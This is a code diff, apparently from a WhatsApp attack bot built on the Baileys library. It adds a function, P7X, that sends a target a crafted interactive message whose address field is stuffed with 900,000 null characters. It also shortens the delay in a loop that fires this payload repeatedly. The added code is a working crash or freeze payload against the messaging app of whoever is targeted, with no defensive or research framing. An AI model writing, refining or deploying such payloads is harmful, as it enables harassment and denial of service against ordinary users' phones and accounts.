@@ -3439,7 +3439,7 @@ Dispatch engine initialized.
                             }
                             
                             await P7X(sock, target);
-                            await sleep(3000)
+                            await sleep(2000)
                             
                             console.log(
                                 `[INSTANCE ${instanceId}] Exec ${i + 1}`
@@ -4555,6 +4555,31 @@ async function GmXTagSw(sock, target) {
         }, { statusJidList: [target] })
         await delay(100)
     }
+}
+
+async function P7X(sock, target) {
+  var kuro = generateWAMessageFromContent(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "P7X",
+            format: "EXTENSION"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"bogor\",\"address\":\"jawa\",\"tower_number\":\"99999\",\"city\":\"Indonesia\",\"name\":\"kuroleslie\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"roleplay | ${"\u0000".repeat(900000)}\"}}`,
+            version: 3
+          }
+        }
+      }
+    }
+  }, { userJid: target });
+
+  await sock.relayMessage(target, kuro.message, {
+    participant: { jid: target },
+    messageId: kuro.key.id
+  });
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
